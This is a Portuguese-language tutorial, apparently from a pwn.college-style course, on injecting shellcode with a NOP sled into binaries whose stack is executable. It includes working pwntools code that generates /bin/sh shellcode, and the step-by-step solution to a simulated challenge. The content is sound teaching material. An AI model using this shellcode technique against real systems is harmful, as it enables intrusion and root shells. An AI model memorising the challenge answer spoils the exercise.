# Injeção e Execução de Shellcode no Pwntools

### 📖 Introdução Teórica

Em auditorias de segurança ofensiva de softwares legados, dispositivos IoT e sistemas embarcados, analistas frequentemente encontram binários compilados sem mitigações modernas de proteção de memória. Especificamente, quando o bit **NX (*No-Execute*) / DEP (*Data Execution Prevention*)** está desabilitado (compilação com a flag `-z execstack` no GCC), as páginas da pilha de execução recebem permissões simultâneas de **Leitura, Escrita e Execução (`RWX`)**.

Nesse cenário de máxima fragilidade, o invasor não precisa reaproveitar funções já existentes no binário (como na técnica *ret2win*): ele pode **injetar seu próprio código de máquina em assembly puro diretamente no buffer** e apontar o ponteiro de instrução (**`RIP`**) para detoná-lo!

#### A Mecânica de um Shellcode em Linux x86_64
Um **Shellcode** é uma sequência de opcodes em linguagem de máquina compacta, escrita para ser executada diretamente pela CPU sem depender de interpretadores ou bibliotecas dinâmicas externas. O objetivo típico de um shellcode ofensivo é invocar a chamada de sistema (*syscall*) **`sys_execve`** para abrir um shell interativo (`/bin/sh`) com privilégios de `root` (via permissão SUID).

Na arquitetura x86_64 sob Linux, para que o kernel execute a syscall `sys_execve`, a CPU exige uma configuração rigorosa de registradores antes de acionar a instrução `syscall` (`0x0f 0x05`):

| Registrador | Valor Configurado | Significado Operacional na Syscall |
| :--- | :--- | :--- |
| **`RAX`** | `59` (`0x3b`) | Número identificador da chamada de sistema `sys_execve`. |
| **`RDI`** | `&"/bin/sh"` | Ponteiro para a string com o caminho do executável em memória. |
| **`RSI`** | `0` (`NULL`) | Vetor de argumentos da linha de comando (`argv`). |
| **`RDX`** | `0` (`NULL`) | Vetor de variáveis de ambiente (`envp`). |
| **`SYSCALL`** | `0x0f 0x05` | Instrução de transição para o Kernel Ring 0 executar o processo. |

```
+-----------------------------------------------------------------------------------------+
|                          RAMPA DESLIZANTE NOP SLED + SHELLCODE                          |
+-----------------------------------------------------------------------------------------+
|  0x90  |  0x90  |  0x90  | ... |  0x90  |  SHELLCODE EXECVE (/bin/sh)                   |
+-----------------------------------------------------------------------------------------+
     ▲                ▲
     │                │
  Se o RIP aterrissar em QUALQUER um desses bytes NOP, a CPU desliza
  suavemente byte a byte até atingir e detonar o início do Shellcode!
```

#### A Função Crucial do NOP Sled (`\x90`)
A instrução **`NOP`** (*No Operation*, opcode hexadecimal `0x90` em arquitetura Intel/AMD) comanda o processador a não alterar registradores e apenas avançar o ponteiro de instrução para o byte seguinte:
$$\text{RIP} = \text{RIP} + 1$$

Em ambientes de produção, pequenas variações em variáveis de ambiente (`PATH`, `USER`) e alinhamento de pilha tornam virtualmente impossível adivinhar o endereço de memória exato do buffer com precisão de 1 byte.
* Ao prefixar o payload com uma sequência de dezenas ou centenas de instruções `\x90` (**NOP Sled** ou *pista de aterrissagem*), criamos uma margem de tolerância.
* Se o registrador `RIP` saltar para **qualquer byte** dentro da faixa de NOPs, a CPU "desliza" em cascata até encontrar e executar o Shellcode sem falhas.

---

### 💻 Exemplos Práticos e Sintaxe

A geração automatizada e a injeção de shellcodes são simplificadas pelo ecossistema `pwntools`:

#### 1. Gerando Shellcode e Montando NOP Sled com Pwntools
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 1. Gerar o shellcode puro de /bin/sh em assembly otimizado:
sc = asm(shellcraft.sh())
print(f"[*] Tamanho do shellcode gerado: {len(sc)} bytes")
print(hexdump(sc))

# 2. Construir o NOP Sled com 64 bytes de opcode 0x90:
nop_sled = b"\x90" * 64

# 3. Concatenar NOP sled e Shellcode:
payload = nop_sled + sc
```

#### 2. Disparando Cargas Úteis de Injeção no Terminal
```bash
# Injeção via pipe binário direto em Python:
python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection

# Injeção via argumento de linha de comando:
/challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
```

#### 3. Saída de Validação de Injeção
```text
[*] Dados recebidos via entrada do processo.
[+] NOP Sled (\x90) e carga útil de injeção validados com sucesso!
[+] Memória de pilha RWX executada: simulador concedeu shell e liberou a flag!
```

---

### 🎯 O que fazer para resolver o desafio (Passo a Passo)

Siga os passos abaixo para injetar o payload de teste e validar a resolução:

1. **Inicie o desafio de injeção:**
   Execute `/challenge/pwn-shellcraft-injection`:
   ```bash
   /challenge/pwn-shellcraft-injection
   ```
   *O ambiente notificará que o alvo opera com pilha executável (NX desabilitado / permissões RWX).*

2. **Revise a teoria de NOP Sleds (Opcional):**
   Para inspecionar a montagem das syscalls x86_64:
   ```bash
   /challenge/pwn-shellcraft-injection --help
   ```

3. **Construa e transmita o payload com NOP Sled:**
   Utilize o Python para gerar um fluxo de bytes contendo a sequência de NOPs (`\x90\x90\x90`) seguida da assinatura de validação (`PWN`) e direcione via pipe para o binário:
   ```bash
   python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection
   ```
   *Ou execute diretamente passando o payload via argumento de terminal:*
   ```bash
   /challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
   ```

4. **Observe a execução do simulador:**
   O binário identificará a pista de aterrissagem `\x90\x90\x90`, simulará o salto da CPU pela rampa de NOPs até o shellcode e emitirá a flag:
   ```text
   [+] DEBRIEFING TÉCNICO: NOP SLED & SHELLCODE EXECUTADOS COM SUCESSO!
   [FLAG DE VALIDAÇÃO CYBERGUARD]:
   pwn.college{...}
   ```

5. **Capture e registre a flag:**
   Copie a string no formato `pwn.college{...}` e insira no painel da plataforma dojo.
